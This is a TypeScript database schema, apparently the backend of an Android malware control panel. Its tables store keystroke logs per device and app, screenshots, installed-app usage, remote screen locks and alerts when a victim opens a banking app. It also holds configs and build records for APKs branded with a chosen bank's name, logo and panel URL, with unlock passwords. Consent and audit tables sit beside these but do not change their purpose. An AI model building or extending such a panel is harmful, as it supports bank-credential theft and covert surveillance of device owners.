import { sql } from "drizzle-orm";
import { datetime, int, mysqlTable, serial, varchar } from "drizzle-orm/mysql-core";

export const users = mysqlTable("users", {
  id: serial("id").primaryKey(),
  openId: varchar("openId", { length: 255 }).notNull(),
  name: varchar("name", { length: 255 }),
  email: varchar("email", { length: 255 }),
  loginMethod: varchar("loginMethod", { length: 255 }),
  role: varchar("role", { length: 20 }),
  lastSignedIn: datetime("lastSignedIn", { mode: "date" }),
});

export const keylogs = mysqlTable("keylogs", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: varchar("deviceId", { length: 255 }).notNull(),
  appName: varchar("appName", { length: 255 }),
  keyText: varchar("keyText", { length: 2048 }),
  key: varchar("key", { length: 255 }),
  isDeleted: int("isDeleted").notNull().default(0),
  createdAt: datetime("createdAt", { mode: "date" }).default(sql`CURRENT_TIMESTAMP`).notNull(),
});

export const apkRuntimeConfigs = mysqlTable("apkRuntimeConfigs", {
  id: serial("id").primaryKey(),
  packageName: varchar("packageName", { length: 255 }).notNull(),
  panelUrl: varchar("panelUrl", { length: 255 }).notNull(),
  appName: varchar("appName", { length: 80 }).notNull(),
  logoUrl: varchar("logoUrl", { length: 255 }),
  bankId: varchar("bankId", { length: 80 }),
  bankCountry: varchar("bankCountry", { length: 80 }),
  bankName: varchar("bankName", { length: 255 }),
  artifactSource: varchar("artifactSource", { length: 20 }),
  buildId: varchar("buildId", { length: 64 }).notNull(),
  createdAt: datetime("createdAt", { mode: "date" }),
  updatedAt: datetime("updatedAt", { mode: "date" }),
});

// ✅ ADICIONADO: Tabela para armazenar builds de APK
export const apkBuilds = mysqlTable("apkBuilds", {
  id: varchar("id", { length: 64 }).primaryKey(),
  userId: int("userId").notNull(),
  appName: varchar("appName", { length: 255 }).notNull(),
  packageName: varchar("packageName", { length: 255 }).notNull(),
  status: varchar("status", { length: 20 }).notNull().default("building"),
  downloadUrl: varchar("downloadUrl", { length: 2048 }),
  filename: varchar("filename", { length: 255 }),
  fileSize: int("fileSize"),
  errorMessage: varchar("errorMessage", { length: 500 }),
  unlockPassword: varchar("unlockPassword", { length: 20 }), // ✅ NOVO: Senha de desbloqueio
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
  updatedAt: datetime("updatedAt", { mode: "date" }).notNull(),
});

export const screenshots = mysqlTable("screenshots", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId").notNull(),
  screenshotUrl: varchar("screenshotUrl", { length: 2048 }),
  imageUrl: varchar("imageUrl", { length: 2048 }),
  fileSize: int("fileSize"),
  captureType: varchar("captureType", { length: 20 }),
  description: varchar("description", { length: 500 }),
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
});

export const appsData = mysqlTable("appsData", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId").notNull(),
  appName: varchar("appName", { length: 255 }),
  appPackage: varchar("appPackage", { length: 255 }),
  appType: varchar("appType", { length: 20 }),
  isInstalled: int("isInstalled").notNull().default(1),
  timeUsed: int("timeUsed").notNull().default(0),
  data: varchar("data", { length: 255 }),
  lastUsed: datetime("lastUsed", { mode: "date" }),
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
  updatedAt: datetime("updatedAt", { mode: "date" }).notNull(),
});

export const screenLocks = mysqlTable("screenLocks", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId").notNull(),
  lockType: varchar("lockType", { length: 50 }),
  reason: varchar("reason", { length: 255 }),
  isLocked: int("isLocked").notNull().default(0),
  locked: int("locked"),
  unlockedAt: datetime("unlockedAt", { mode: "date" }),
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
});

export const bankAccessAlerts = mysqlTable("bankAccessAlerts", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId").notNull(),
  alertType: varchar("alertType", { length: 255 }),
  bankName: varchar("bankName", { length: 255 }),
  bankApp: varchar("bankApp", { length: 255 }),
  accessTime: datetime("accessTime", { mode: "date" }),
  duration: int("duration"),
  location: varchar("location", { length: 500 }),
  alertSent: int("alertSent").notNull().default(0),
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
});

export const lgpdConsents = mysqlTable("lgpdConsents", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId"),
  consentType: varchar("consentType", { length: 255 }),
  isConsented: int("isConsented"),
  granted: int("granted"),
  consentDate: datetime("consentDate", { mode: "date" }),
  expiresAt: datetime("expiresAt", { mode: "date" }),
  documentVersion: varchar("documentVersion", { length: 50 }),
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
});

export const auditLogs = mysqlTable("auditLogs", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId"),
  action: varchar("action", { length: 255 }),
  actorType: varchar("actorType", { length: 20 }),
  actorId: int("actorId"),
  dataAccessed: varchar("dataAccessed", { length: 255 }),
  ipAddress: varchar("ipAddress", { length: 64 }),
  userAgent: varchar("userAgent", { length: 500 }),
  status: varchar("status", { length: 20 }),
  createdAt: datetime("createdAt", { mode: "date" }).notNull(),
});

export const dataRetentionPolicies = mysqlTable("dataRetentionPolicies", {
  id: serial("id").primaryKey(),
  userId: int("userId"),
  policyName: varchar("policyName", { length: 255 }),
  description: varchar("description", { length: 255 }),
  dataType: varchar("dataType", { length: 50 }),
  retentionDays: int("retentionDays"),
  daysToRetain: int("daysToRetain"),
  autoDelete: int("autoDelete"),
  lastDeletedAt: datetime("lastDeletedAt", { mode: "date" }),
  createdAt: datetime("createdAt", { mode: "date" }),
  updatedAt: datetime("updatedAt", { mode: "date" }),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

export type Keylog = typeof keylogs.$inferSelect;
export type InsertKeylog = typeof keylogs.$inferInsert;

// ✅ ADICIONADO: Types para APK Builds
export type APKBuild = typeof apkBuilds.$inferSelect;
export type InsertAPKBuild = typeof apkBuilds.$inferInsert;
